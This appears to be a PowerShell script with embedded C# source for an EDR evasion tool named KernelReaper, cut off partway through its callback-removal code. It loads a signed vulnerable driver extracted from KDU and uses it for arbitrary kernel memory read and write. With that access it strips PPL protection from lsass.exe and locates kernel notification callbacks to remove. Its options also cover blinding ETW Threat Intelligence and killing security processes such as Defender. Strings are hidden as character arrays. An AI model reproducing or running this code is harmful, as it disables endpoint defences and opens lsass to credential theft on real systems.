<#
.SYNOPSIS
    Kernel-level EDR evasion toolkit using RootLaser.sys (KDU Provider 65)
    Extracts WHQL-signed driver from KDU's drv64.dll for direct kernel VA R/W.

.PARAMETER Drv64Path
    Path to KDU's drv64.dll (default: .\drv64.dll)
.PARAMETER DriverPath
    Path to RootLaser.sys if already extracted
.PARAMETER ServiceName
    Kernel service name (default: RLaserSvc)
.PARAMETER RemovePPL
    Remove RunAsPPL from lsass.exe
.PARAMETER Callbacks
    Remove kernel notification callbacks (process, thread, image load, object, registry)
.PARAMETER TokenDowngrade
    Strip privileges from target process tokens
.PARAMETER ETWBlind
    Disable kernel ETW Threat Intelligence provider
.PARAMETER EDRKill
    Terminate EDR processes (after PPL/callback removal)
.PARAMETER TargetEDR
    Comma-separated EDR process names (default: common EDR list)
.PARAMETER All
    Enable all operations
#>
param(
    [string]$Drv64Path = ".\drv64.dll",
    [string]$DriverPath = "",
    [string]$ServiceName = "RLaserSvc",
    [switch]$RemovePPL,
    [switch]$Callbacks,
    [switch]$TokenDowngrade,
    [switch]$ETWBlind,
    [switch]$EDRKill,
    [string]$TargetEDR = "",
    [int[]]$TargetPID = @(),
    [switch]$All,
    [switch]$CallbacksDryRun,
    [string]$DebugLog = "",
    [Alias('h')][switch]$Help
)

$ErrorActionPreference = 'Stop'

function Show-Help {
    Write-Host ""
    Write-Host "  KernelReaper - Kernel-level EDR Evasion Toolkit" -ForegroundColor Cyan
    Write-Host "  RootLaser.sys (KDU Provider 65) - WHQL-signed driver" -ForegroundColor DarkCyan
    Write-Host ""
    Write-Host "  Usage:" -ForegroundColor Yellow
    Write-Host "    .\Invoke-KernelReaper.ps1 [options]"
    Write-Host ""
    Write-Host "  Modules:" -ForegroundColor Yellow
    Write-Host "    -RemovePPL          Remove RunAsPPL protection from lsass.exe"
    Write-Host "    -Callbacks          Remove EDR kernel callbacks (process, thread, image, object, registry)"
    Write-Host "    -CallbacksDryRun    List EDR kernel callbacks without removing them"
    Write-Host "    -ETWBlind           Disable ETW Threat Intelligence provider"
    Write-Host "    -TokenDowngrade     Strip privileges from EDR process tokens"
    Write-Host "    -EDRKill            Terminate EDR processes (strips protections first)"
    Write-Host "    -All                Run all modules"
    Write-Host ""
    Write-Host "  Options:" -ForegroundColor Yellow
    Write-Host "    -TargetEDR <list>   Comma-separated EDR process names (default: built-in list)"
    Write-Host "    -TargetPID <pids>   Target specific PIDs instead of EDR list"
    Write-Host "    -Drv64Path <path>   Path to drv64.dll (default: .\drv64.dll)"
    Write-Host "    -DriverPath <path>  Path to pre-extracted RootLaser.sys"
    Write-Host "    -ServiceName <name> Kernel service name (default: RLaserSvc)"
    Write-Host "    -DebugLog <path>    Write debug log to file"
    Write-Host "    -h                  Show this help"
    Write-Host ""
    Write-Host "  Examples:" -ForegroundColor Yellow
    Write-Host "    .\Invoke-KernelReaper.ps1 -RemovePPL"
    Write-Host "    .\Invoke-KernelReaper.ps1 -Callbacks -ETWBlind"
    Write-Host "    .\Invoke-KernelReaper.ps1 -EDRKill -TargetEDR `"MsMpEng.exe,CrowdStrike.exe`""
    Write-Host "    .\Invoke-KernelReaper.ps1 -All"
    Write-Host ""
    exit 0
}

if ($Help) { Show-Help }

$CSharpCode = @'
using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;

public static class PPLRemover
{
    public static string DebugLogFile = null;
    public static void DbgLog(string msg)
    {
        Console.WriteLine(msg);
        if (DebugLogFile != null)
        {
            try { File.AppendAllText(DebugLogFile, msg + "\r\n"); } catch {}
        }
    }
    public static void DbgLog(string fmt, params object[] args) { DbgLog(String.Format(fmt, args)); }

    #region Constants

    public const uint IOCTL_RLASER_READ  = 0x0022E050;
    public const uint IOCTL_RLASER_WRITE = 0x0022E014;
    public const uint RLASER_MAGIC       = 0xEE00AA77;
    public const ulong RLASER_WRITE_BIAS = 0x70;

    public const int    IDR_KDUDB             = 7000;
    public const uint   RESOURCE_DB_SIGNATURE = 0x58444D52;
    public const int    PROVIDER_65_RESID     = 167;
    public const uint   PROVIDER_RES_KEY      = 0xF62E6CE0;

    public const uint GENERIC_READ       = 0x80000000;
    public const uint GENERIC_WRITE      = 0x40000000;
    public const uint OPEN_EXISTING      = 3;
    public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    public const uint SC_MANAGER_ALL     = 0xF003F;
    public const uint SERVICE_ALL        = 0xF01FF;
    public const uint SERVICE_KERNEL_DRIVER = 1;
    public const uint SERVICE_DEMAND_START  = 3;
    public const uint SERVICE_ERROR_NORMAL  = 1;
    public const uint SERVICE_CONTROL_STOP  = 1;
    public const uint LOAD_LIBRARY_AS_DATAFILE = 2;
    public const uint LOAD_LIBRARY_AS_IMAGE_RESOURCE = 0x20;
    public const int  RT_RCDATA = 10;
    public const int  MAX_CALLBACK_SLOTS = 64;

    public const int TOKEN_PRIV_PRESENT = 0x40;
    public const int TOKEN_PRIV_ENABLED = 0x48;
    public const int TOKEN_PRIV_DEFAULT = 0x50;

    public static readonly IntPtr INVALID_HANDLE = new IntPtr(-1);

    #endregion

    #region P/Invoke

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr LoadLibraryExW(string path, IntPtr hFile, uint flags);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr FindResourceW(IntPtr hModule, IntPtr lpName, IntPtr lpType);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LockResource(IntPtr hResData);

    [DllImport("kernel32.dll")]
    public static extern bool FreeLibrary(IntPtr hModule);

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string path, uint access, uint share,
        IntPtr sec, uint disp, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr hDev, uint code,
        byte[] inBuf, uint inSz, byte[] outBuf, uint outSz,
        out uint returned, IntPtr ovlp);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr OpenSCManagerW(string machine, string db, uint access);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateServiceW(IntPtr hSCM, string name, string display,
        uint access, uint type, uint start, uint error, string path,
        string group, IntPtr tag, string deps, string user, string pass);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr OpenServiceW(IntPtr hSCM, string name, uint access);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool StartServiceW(IntPtr hSvc, uint argc, IntPtr argv);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ControlService(IntPtr hSvc, uint ctrl, byte[] status);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DeleteService(IntPtr hSvc);

    [DllImport("advapi32.dll")]
    public static extern bool CloseServiceHandle(IntPtr h);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool TerminateProcess(IntPtr hProc, uint exitCode);

    [DllImport("ntdll.dll")]
    static extern int NtTerminateProcess(IntPtr hProc, int exitStatus);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr hProc, uint access, out IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool LookupPrivilegeValueW(string sys, string name, out long luid);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool AdjustTokenPrivileges(IntPtr hToken, bool disableAll, ref TOKEN_PRIVILEGES newState, int bufLen, IntPtr prev, IntPtr retLen);

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES { public int Count; public long Luid; public int Attributes; }

    static bool EnableDebugPrivilege()
    {
        IntPtr hToken;
        if (!OpenProcessToken((IntPtr)(-1), 0x0028, out hToken)) return false;
        long luid;
        string privName = new string(new char[]{'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e'});
        if (!LookupPrivilegeValueW(null, privName, out luid)) { CloseHandle(hToken); return false; }
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { Count = 1, Luid = luid, Attributes = 2 };
        bool ok = AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        CloseHandle(hToken);
        return ok;
    }

    [DllImport("psapi.dll", SetLastError=true)]
    public static extern bool EnumDeviceDrivers(IntPtr[] bases, uint cb, out uint needed);

    [DllImport("psapi.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern int GetDeviceDriverBaseNameW(IntPtr imgBase, StringBuilder name, int sz);

    [StructLayout(LayoutKind.Sequential)]
    public struct DELTA_INPUT {
        public IntPtr lpcStart; public IntPtr uSize;
        [MarshalAs(UnmanagedType.Bool)] public bool Editable;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct DELTA_OUTPUT { public IntPtr lpStart; public IntPtr uSize; }

    [DllImport("msdelta.dll", SetLastError=true)]
    public static extern bool ApplyDeltaB(long flags, DELTA_INPUT src, DELTA_INPUT delta, out DELTA_OUTPUT output);
    [DllImport("msdelta.dll")]
    public static extern bool DeltaFree(IntPtr mem);

    #endregion

    #region Resource extraction

    public static byte[] ExtractDriverFromDB(string drv64Path)
    {
        IntPtr hDll = LoadLibraryExW(drv64Path, IntPtr.Zero,
            LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
        if (hDll == IntPtr.Zero)
            throw new Exception("LoadLibraryEx failed: " + Marshal.GetLastWin32Error());
        try
        {
            IntPtr hRes = FindResourceW(hDll, (IntPtr)IDR_KDUDB, (IntPtr)RT_RCDATA);
            if (hRes == IntPtr.Zero) throw new Exception("FindResource failed");
            uint resSz = SizeofResource(hDll, hRes);
            IntPtr hData = LoadResource(hDll, hRes);
            IntPtr pData = LockResource(hData);
            if (pData == IntPtr.Zero || resSz < 12) throw new Exception("LockResource failed");

            byte[] dbRaw = new byte[resSz];
            Marshal.Copy(pData, dbRaw, 0, (int)resSz);

            uint sig = BitConverter.ToUInt32(dbRaw, 0);
            if (sig != RESOURCE_DB_SIGNATURE)
                throw new Exception(String.Format("Bad DB sig: 0x{0:X8}", sig));

            uint entryCount = BitConverter.ToUInt32(dbRaw, 8);
            int left = 0, right = (int)entryCount - 1;
            int foundOff = -1, foundSz = -1;
            while (left <= right)
            {
                int mid = (left + right) / 2;
                int eo = 12 + mid * 12;
                uint id = BitConverter.ToUInt32(dbRaw, eo);
                if (id == PROVIDER_65_RESID) { foundOff = (int)BitConverter.ToUInt32(dbRaw, eo+4); foundSz = (int)BitConverter.ToUInt32(dbRaw, eo+8); break; }
                if (id < PROVIDER_65_RESID) left = mid+1; else right = mid-1;
            }
            if (foundOff < 0) throw new Exception("Provider 65 (ResId 167) not found");
            Console.WriteLine("[*] Provider 65: off=0x{0:X}, sz=0x{1:X}", foundOff, foundSz);

            byte[] enc = new byte[foundSz];
            Array.Copy(dbRaw, foundOff, enc, 0, foundSz);
            XorDecode(enc, PROVIDER_RES_KEY);

            byte[] drv = MsDeltaDecompress(enc);
            if (drv == null || drv.Length < 2 || drv[0] != 0x4D || drv[1] != 0x5A)
                throw new Exception("Decompressed data is not a valid PE");
            Console.WriteLine("[+] Driver extracted: {0} bytes", drv.Length);
            return drv;
        }
        finally { FreeLibrary(hDll); }
    }

    public static void XorDecode(byte[] buf, uint key)
    {
        uint k = key;
        for (int i = 0; i < buf.Length; i++) { buf[i] ^= (byte)(k & 0xFF); k = (k << 1) | (k >> 31); }
    }

    public static byte[] MsDeltaDecompress(byte[] data)
    {
        IntPtr p = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, p, data.Length);
        DELTA_INPUT src = new DELTA_INPUT(), delta = new DELTA_INPUT { lpcStart = p, uSize = (IntPtr)data.Length };
        DELTA_OUTPUT output;
        try
        {
            if (!ApplyDeltaB(3, src, delta, out output))
                throw new Exception("ApplyDeltaB failed: " + Marshal.GetLastWin32Error());
            byte[] res = new byte[(int)output.uSize];
            Marshal.Copy(output.lpStart, res, 0, res.Length);
            DeltaFree(output.lpStart);
            return res;
        }
        finally { Marshal.FreeHGlobal(p); }
    }

    #endregion

    #region Service management

    public static void InstallDriver(string sysPath, string serviceName)
    {
        IntPtr hSCM = OpenSCManagerW(null, null, SC_MANAGER_ALL);
        if (hSCM == IntPtr.Zero) throw new Exception("OpenSCManager failed: " + Marshal.GetLastWin32Error());
        try
        {
            IntPtr hSvc = OpenServiceW(hSCM, serviceName, SERVICE_ALL);
            if (hSvc != IntPtr.Zero) { ControlService(hSvc, SERVICE_CONTROL_STOP, new byte[28]); DeleteService(hSvc); CloseServiceHandle(hSvc); System.Threading.Thread.Sleep(500); }
            hSvc = CreateServiceW(hSCM, serviceName, serviceName, SERVICE_ALL, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, sysPath, null, IntPtr.Zero, null, null, null);
            if (hSvc == IntPtr.Zero) throw new Exception("CreateService failed: " + Marshal.GetLastWin32Error());
            if (!StartServiceW(hSvc, 0, IntPtr.Zero)) { int e = Marshal.GetLastWin32Error(); DeleteService(hSvc); CloseServiceHandle(hSvc); throw new Exception("StartService failed: " + e); }
            Console.WriteLine("[+] Driver loaded: {0}", serviceName);
            CloseServiceHandle(hSvc);
        }
        finally { CloseServiceHandle(hSCM); }
    }

    public static void UnloadDriver(string serviceName)
    {
        IntPtr hSCM = OpenSCManagerW(null, null, SC_MANAGER_ALL);
        if (hSCM == IntPtr.Zero) return;
        IntPtr hSvc = OpenServiceW(hSCM, serviceName, SERVICE_ALL);
        if (hSvc != IntPtr.Zero) { ControlService(hSvc, SERVICE_CONTROL_STOP, new byte[28]); DeleteService(hSvc); CloseServiceHandle(hSvc); }
        CloseServiceHandle(hSCM);
        Console.WriteLine("[+] Driver unloaded");
    }

    static string _devName = new string(new char[]{'\\','\\','.','\\','R','o','o','t','L','a','s','e','r'});

    public static IntPtr OpenDevice()
    {
        IntPtr h = CreateFileW(_devName, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (h == INVALID_HANDLE || h == IntPtr.Zero) throw new Exception("OpenDevice failed: " + Marshal.GetLastWin32Error());
        return h;
    }

    #endregion

    #region Kernel R/W

    public static bool ReadKernelVM(IntPtr hDev, ulong addr, byte[] buf, int count)
    {
        int reqSz = 16 + count;
        byte[] io = new byte[reqSz];
        BitConverter.GetBytes(addr).CopyTo(io, 0);
        BitConverter.GetBytes((uint)count).CopyTo(io, 8);
        uint ret;
        bool ok = DeviceIoControl(hDev, IOCTL_RLASER_READ, io, (uint)reqSz, io, (uint)reqSz, out ret, IntPtr.Zero);
        if (ok) Array.Copy(io, 0, buf, 0, count);
        return ok;
    }

    public static bool WriteKernelDword(IntPtr hDev, ulong addr, uint value)
    {
        byte[] buf = new byte[32];
        BitConverter.GetBytes(RLASER_MAGIC).CopyTo(buf, 0);
        BitConverter.GetBytes(addr - RLASER_WRITE_BIAS).CopyTo(buf, 8);
        BitConverter.GetBytes((ulong)value).CopyTo(buf, 24);
        uint ret;
        return DeviceIoControl(hDev, IOCTL_RLASER_WRITE, buf, 32, null, 0, out ret, IntPtr.Zero);
    }

    // RootLaser IOCTL writes a full QWORD (8 bytes) at the target address.
    // The Value field at buf[24..31] is written entirely, so we must pass the full 8-byte value.
    public static bool WriteKernelQword(IntPtr hDev, ulong addr, ulong value)
    {
        byte[] buf = new byte[32];
        BitConverter.GetBytes(RLASER_MAGIC).CopyTo(buf, 0);
        BitConverter.GetBytes(addr - RLASER_WRITE_BIAS).CopyTo(buf, 8);
        BitConverter.GetBytes(value).CopyTo(buf, 24);
        uint ret;
        return DeviceIoControl(hDev, IOCTL_RLASER_WRITE, buf, 32, null, 0, out ret, IntPtr.Zero);
    }

    public static bool WriteKernelVM(IntPtr hDev, ulong addr, byte[] data, int count)
    {
        int rem = count; ulong cur = addr; int off = 0;
        while (rem > 0)
        {
            if (rem >= 8)
            {
                ulong v = BitConverter.ToUInt64(data, off);
                if (!WriteKernelQword(hDev, cur, v)) return false;
                rem -= 8; off += 8; cur += 8;
            }
            else
            {
                byte[] orig = new byte[8];
                if (!ReadKernelVM(hDev, cur, orig, 8)) return false;
                Array.Copy(data, off, orig, 0, rem);
                ulong v = BitConverter.ToUInt64(orig, 0);
                if (!WriteKernelQword(hDev, cur, v)) return false;
                rem = 0;
            }
        }
        return true;
    }

    public static ulong ReadKernelUlong64(IntPtr hDev, ulong va)
    {
        byte[] b = new byte[8];
        if (!ReadKernelVM(hDev, va, b, 8)) throw new Exception(String.Format("ReadKernelVM fail @ 0x{0:X}", va));
        return BitConverter.ToUInt64(b, 0);
    }

    public static void ReadKernelBytes(IntPtr hDev, ulong va, byte[] dst, int count)
    {
        if (!ReadKernelVM(hDev, va, dst, count)) throw new Exception(String.Format("ReadKernelVM fail @ 0x{0:X}", va));
    }

    #endregion

    #region PE exports

    static uint FindExportRVA(byte[] pe, string exportName)
    {
        int peOff = BitConverter.ToInt32(pe, 0x3C);
        int optOff = peOff + 24;
        ushort magic = BitConverter.ToUInt16(pe, optOff);
        int edd = (magic == 0x20B) ? 112 : 96;
        uint exportRVA = BitConverter.ToUInt32(pe, optOff + edd);
        if (exportRVA == 0) return 0;
        int numSect = BitConverter.ToUInt16(pe, peOff + 6);
        int szOpt = BitConverter.ToUInt16(pe, peOff + 20);
        int sectOff = peOff + 24 + szOpt;
        int expOff = RvaToOff(pe, exportRVA, sectOff, numSect);
        uint nNames = BitConverter.ToUInt32(pe, expOff + 24);
        uint aoFuncs = BitConverter.ToUInt32(pe, expOff + 28);
        uint aoNames = BitConverter.ToUInt32(pe, expOff + 32);
        uint aoOrds = BitConverter.ToUInt32(pe, expOff + 36);
        int nOff = RvaToOff(pe, aoNames, sectOff, numSect);
        int oOff = RvaToOff(pe, aoOrds, sectOff, numSect);
        int fOff = RvaToOff(pe, aoFuncs, sectOff, numSect);
        for (uint i = 0; i < nNames; i++)
        {
            uint nRVA = BitConverter.ToUInt32(pe, nOff + (int)(i*4));
            int nfo = RvaToOff(pe, nRVA, sectOff, numSect);
            int end = nfo; while (end < pe.Length && pe[end] != 0) end++;
            if (Encoding.ASCII.GetString(pe, nfo, end-nfo) == exportName)
            {
                ushort ord = BitConverter.ToUInt16(pe, oOff + (int)(i*2));
                return BitConverter.ToUInt32(pe, fOff + ord*4);
            }
        }
        return 0;
    }

    static int RvaToOff(byte[] pe, uint rva, int sectOff, int numSect)
    {
        for (int i = 0; i < numSect; i++)
        {
            int s = sectOff + i*40;
            uint va = BitConverter.ToUInt32(pe, s+12);
            uint rs = BitConverter.ToUInt32(pe, s+16);
            uint rp = BitConverter.ToUInt32(pe, s+20);
            uint vs = BitConverter.ToUInt32(pe, s+8);
            if (rva >= va && rva < va + Math.Max(rs, vs)) return (int)(rva - va + rp);
        }
        throw new Exception(String.Format("RVA 0x{0:X} resolve fail", rva));
    }

    static byte[] _ntPE = null;
    static byte[] GetNtPE()
    {
        if (_ntPE == null)
            _ntPE = File.ReadAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), new string(new char[]{'n','t','o','s','k','r','n','l','.','e','x','e'})));
        return _ntPE;
    }

    public static ulong FindExportVA(ulong ntBase, string name)
    {
        uint rva = FindExportRVA(GetNtPE(), name);
        if (rva == 0) throw new Exception("Export not found: " + name);
        return ntBase + rva;
    }

    #endregion

    #region EPROCESS offsets

    public struct EprocOff
    {
        public int Pid, Links, Name, SigLevel, SectSigLevel, Protection, Token;
    }

    public static EprocOff GetOffsets()
    {
        int b = Environment.OSVersion.Version.Build;
        DbgLog("[*] NT Build: {0}", b);
        // Win11 24H2 / Server 2025
        if (b >= 26100) return new EprocOff { Pid=0x1D0, Links=0x1D8, Name=0x338, SigLevel=0x5F8, SectSigLevel=0x5F9, Protection=0x5FA, Token=0x248 };
        // Win11 21H2-23H2 (22000-22631)
        if (b >= 22000) return new EprocOff { Pid=0x440, Links=0x448, Name=0x5A8, SigLevel=0x878, SectSigLevel=0x879, Protection=0x87A, Token=0x4B8 };
        // Win10 2004-22H2 / Server 2022 (19041-20348)
        if (b >= 19041) return new EprocOff { Pid=0x440, Links=0x448, Name=0x5A8, SigLevel=0x878, SectSigLevel=0x879, Protection=0x87A, Token=0x4B8 };
        // Win10 1903/1909 (18362-18363)
        if (b >= 18362) return new EprocOff { Pid=0x2E8, Links=0x2F0, Name=0x450, SigLevel=0x6F8, SectSigLevel=0x6F9, Protection=0x6FA, Token=0x360 };
        // Win10 1607-1809 / Server 2016 / Server 2019 (14393-17763)
        if (b >= 14393) return new EprocOff { Pid=0x2E8, Links=0x2F0, Name=0x450, SigLevel=0x6C8, SectSigLevel=0x6C9, Protection=0x6CA, Token=0x358 };
        // Win10 1507/1511 (10240-10586)
        if (b >= 10240) return new EprocOff { Pid=0x2E0, Links=0x2E8, Name=0x448, SigLevel=0x6A8, SectSigLevel=0x6A9, Protection=0x6AA, Token=0x358 };
        // Win8.1 / Server 2012 R2 (9600)
        if (b >= 9600) return new EprocOff { Pid=0x2E0, Links=0x2E8, Name=0x438, SigLevel=0x648, SectSigLevel=0x649, Protection=0x64A, Token=0x348 };
        // Win8 / Server 2012 (9200) - NO PPL
        if (b >= 9200) return new EprocOff { Pid=0x2E0, Links=0x2E8, Name=0x438, SigLevel=-1, SectSigLevel=-1, Protection=-1, Token=0x348 };
        // Win7 SP1 / Server 2008 R2 (7601) - NO PPL, NO ETW TI
        if (b >= 7601) return new EprocOff { Pid=0x180, Links=0x188, Name=0x2E0, SigLevel=-1, SectSigLevel=-1, Protection=-1, Token=0x208 };
        // Vista SP2 / Server 2008 SP2 (6003) - NO PPL, NO ETW TI
        if (b >= 6000) return new EprocOff { Pid=0x0E0, Links=0x0E8, Name=0x238, SigLevel=-1, SectSigLevel=-1, Protection=-1, Token=0x168 };
        throw new Exception("Unsupported build: " + b + " (min: Server 2008 / 6000)");
    }

    public static ulong GetNtBase()
    {
        uint needed; EnumDeviceDrivers(null, 0, out needed);
        IntPtr[] bases = new IntPtr[(int)(needed / (uint)IntPtr.Size)];
        EnumDeviceDrivers(bases, needed, out needed);
        StringBuilder nm = new StringBuilder(260);
        GetDeviceDriverBaseNameW(bases[0], nm, 260);
        Console.WriteLine("[*] Kernel: {0} @ 0x{1:X}", nm, (ulong)(long)bases[0]);
        return (ulong)(long)bases[0];
    }

    struct DriverRange { public ulong Base; public string Name; }

    static DriverRange[] GetDriverRanges()
    {
        uint needed; EnumDeviceDrivers(null, 0, out needed);
        int cnt = (int)(needed / (uint)IntPtr.Size);
        IntPtr[] bases = new IntPtr[cnt];
        EnumDeviceDrivers(bases, needed, out needed);
        DriverRange[] ranges = new DriverRange[cnt];
        StringBuilder nm = new StringBuilder(260);
        for (int i = 0; i < cnt; i++)
        {
            GetDeviceDriverBaseNameW(bases[i], nm, 260);
            ranges[i] = new DriverRange { Base = (ulong)(long)bases[i], Name = nm.ToString().ToLower() };
            nm.Clear();
        }
        return ranges;
    }

    static string FindDriverForAddr(DriverRange[] ranges, ulong addr)
    {
        string best = "???";
        ulong bestBase = 0;
        for (int i = 0; i < ranges.Length; i++)
        {
            if (addr >= ranges[i].Base && ranges[i].Base > bestBase) { bestBase = ranges[i].Base; best = ranges[i].Name; }
        }
        return best;
    }

    #endregion

    #region RemovePPL

    public static ulong FindLsassEprocess(IntPtr hDev, EprocOff off, ulong ntBase)
    {
        ulong psiVA = FindExportVA(ntBase, new string(new char[]{'P','s','I','n','i','t','i','a','l','S','y','s','t','e','m','P','r','o','c','e','s','s'}));
        ulong sysEp = ReadKernelUlong64(hDev, psiVA);
        Console.WriteLine("[*] System EPROCESS: 0x{0:X}", sysEp);

        ulong head = sysEp + (ulong)off.Links;
        ulong cur = ReadKernelUlong64(hDev, head);
        int maxIter = 4096;
        while (cur != head && cur != 0 && maxIter-- > 0)
        {
            ulong ep = cur - (ulong)off.Links;
            byte[] nb = new byte[15];
            ReadKernelBytes(hDev, ep + (ulong)off.Name, nb, 15);
            string nm = Encoding.ASCII.GetString(nb).TrimEnd('\0');
            if (nm.Equals(new string(new char[]{'l','s','a','s','s','.','e','x','e'}), StringComparison.OrdinalIgnoreCase))
                return ep;
            cur = ReadKernelUlong64(hDev, cur);
        }
        return 0;
    }

    public static int DoRemovePPL(IntPtr hDev, EprocOff off, ulong ntBase)
    {
        if (off.Protection < 0) { DbgLog("[-] PPL not available on this build (pre-8.1)"); return 0; }
        ulong psiVA = FindExportVA(ntBase, new string(new char[]{'P','s','I','n','i','t','i','a','l','S','y','s','t','e','m','P','r','o','c','e','s','s'}));
        ulong sysEp = ReadKernelUlong64(hDev, psiVA);
        ulong head = sysEp + (ulong)off.Links;
        ulong cur = ReadKernelUlong64(hDev, head);
        int count = 0, maxIter = 4096;
        while (cur != head && cur != 0 && maxIter-- > 0)
        {
            ulong ep = cur - (ulong)off.Links;
            byte[] nb = new byte[15];
            ReadKernelBytes(hDev, ep + (ulong)off.Name, nb, 15);
            string nm = Encoding.ASCII.GetString(nb).TrimEnd('\0');
            if (nm.Equals(new string(new char[]{'l','s','a','s','s','.','e','x','e'}), StringComparison.OrdinalIgnoreCase))
            {
                ulong pid = ReadKernelUlong64(hDev, ep + (ulong)off.Pid);
                DbgLog("[PPL] lsass.exe PID {0} EPROCESS 0x{1:X}", pid, ep);
                ulong sva = ep + (ulong)off.SigLevel;
                byte[] pb = new byte[3]; ReadKernelBytes(hDev, sva, pb, 3);
                DbgLog("[PPL] SigLevel=0x{0:X2} SectSig=0x{1:X2} Prot=0x{2:X2}", pb[0], pb[1], pb[2]);
                if (pb[2] != 0)
                {
                    WriteKernelVM(hDev, sva, new byte[]{0,0,0}, 3);
                    ReadKernelBytes(hDev, sva, pb, 3);
                    DbgLog("[+] PPL removed! SigLevel=0x{0:X2} SectSig=0x{1:X2} Prot=0x{2:X2}", pb[0], pb[1], pb[2]);
                }
                else DbgLog("[=] Already unprotected");
                count++; break;
            }
            cur = ReadKernelUlong64(hDev, cur);
        }
        if (count == 0) DbgLog("[-] lsass not found");
        return count;
    }

    #endregion

    #region Callback removal

    // Resolve RIP-relative displacement in an on-disk PE to kernel VA
    // instrFileOff = file offset of the instruction start
    // instrLen = total instruction length (e.g., 7 for REX+LEA+ModRM+disp32)
    // The displacement is at instrFileOff + instrLen - 4
    static uint ResolveRipRelativeRVA(byte[] pe, int instrFileOff, int instrLen, int sectOff, int numSect)
    {
        int disp = BitConverter.ToInt32(pe, instrFileOff + instrLen - 4);
        // Convert file offset of next instruction to RVA
        uint nextInstrRVA = FileOffToRva(pe, (uint)(instrFileOff + instrLen), sectOff, numSect);
        return (uint)((long)nextInstrRVA + disp);
    }

    static uint FileOffToRva(byte[] pe, uint fileOff, int sectOff, int numSect)
    {
        for (int i = 0; i < numSect; i++)
        {
            int s = sectOff + i * 40;
            uint va = BitConverter.ToUInt32(pe, s + 12);
            uint rs = BitConverter.ToUInt32(pe, s + 16);
            uint rp = BitConverter.ToUInt32(pe, s + 20);
            if (fileOff >= rp && fileOff < rp + rs)
                return va + (fileOff - rp);
        }
        return 0;
    }

    // Find callback array RVA by scanning the on-disk PE file
    static uint FindCallbackArrayRVA(string exportName)
    {
        byte[] pe = GetNtPE();
        int peOff = BitConverter.ToInt32(pe, 0x3C);
        int numSect = BitConverter.ToUInt16(pe, peOff + 6);
        int szOpt = BitConverter.ToUInt16(pe, peOff + 20);
        int sectOff = peOff + 24 + szOpt;

        uint exportRva = FindExportRVA(pe, exportName);
        if (exportRva == 0) return 0;
        int funcOff = RvaToOff(pe, exportRva, sectOff, numSect);

        // Read 128 bytes of the exported function
        // Follow the first E8 (CALL) or E9 (JMP) to the internal Psp* function
        int searchLen = Math.Min(128, pe.Length - funcOff);
        int innerOff = funcOff; // Default: scan the exported function itself

        for (int i = 0; i < Math.Min(64, searchLen); i++)
        {
            if (pe[funcOff + i] == 0xE8 || pe[funcOff + i] == 0xE9)
            {
                int disp = BitConverter.ToInt32(pe, funcOff + i + 1);
                uint nextRVA = FileOffToRva(pe, (uint)(funcOff + i + 5), sectOff, numSect);
                if (nextRVA == 0) continue;
                uint targetRVA = (uint)((long)nextRVA + disp);
                try { innerOff = RvaToOff(pe, targetRVA, sectOff, numSect); } catch { continue; }
                DbgLog("    -> inner func RVA 0x{0:X}", targetRVA);
                break;
            }
        }

        // In the inner function, find LEA RCX,[RIP+disp32]: 48 8D 0D xx xx xx xx
        // This is the array address loaded as first argument
        int innerSearchLen = Math.Min(256, pe.Length - innerOff);
        for (int i = 0; i < innerSearchLen - 7; i++)
        {
            if (pe[innerOff + i] == 0x48 && pe[innerOff + i + 1] == 0x8D && pe[innerOff + i + 2] == 0x0D)
            {
                uint arrayRVA = ResolveRipRelativeRVA(pe, innerOff + i, 7, sectOff, numSect);
                if (arrayRVA > 0 && arrayRVA < 0x10000000) // Reasonable RVA range
                {
                    DbgLog("    -> LEA RCX found, array RVA 0x{0:X}", arrayRVA);
                    return arrayRVA;
                }
            }
        }

        // Fallback: also try LEA R8/RDX (4C 8D 05 / 48 8D 15) but only after no RCX found
        for (int i = 0; i < innerSearchLen - 7; i++)
        {
            bool match = false;
